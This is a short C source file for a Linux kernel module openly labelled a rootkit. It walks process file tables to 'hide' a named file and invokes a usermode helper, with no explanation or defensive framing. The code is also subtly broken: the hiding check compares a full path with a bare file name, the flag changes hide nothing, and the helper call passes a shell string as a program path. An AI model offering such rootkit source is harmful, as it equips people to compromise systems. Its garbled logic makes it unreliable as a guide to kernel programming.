#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>

static int is_hidden_file(const char *path)
{
    if (strstr(path, "/home/user/documents/secret.txt") != NULL) {
        return 1;
    }
    return 0;
}

static int rootkit_init(void)
{
    struct task_struct *task;
    struct file *file;
    char *buf = NULL;
    int res;
    mm_segment_t old_fs;

    printk(KERN_INFO "rootkit: loaded\n");

    for_each_process(task) {
        old_fs = get_fs();
        set_fs(KERNEL_DS);
        for (int fd = 0; fd < NR_OPEN; fd++) {
            file = task->files->fdt->fd[fd];
            if (file) {
                if (is_hidden_file(file->f_path.dentry->d_name.name)) {
                    file->f_pos = 0;
                    file->f_version = 0;
                    file->f_flags |= O_DIRECT;
                }
            }
        }
        set_fs(old_fs);
    }

    buf = kzalloc(PAGE_SIZE, GFP_KERNEL);
    if (!buf) {
        return -ENOMEM;
    }

    snprintf(buf, PAGE_SIZE, "echo rootkit > /proc/modules");
    res = call_usermodehelper(buf, NULL, NULL, UMH_NO_WAIT);
    if (res != 0) {
        printk(KERN_ALERT "rootkit: failed to execute usermode helper\n");
    }

    kfree(buf);

    return 0;
}

static void rootkit_exit(void)
{
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
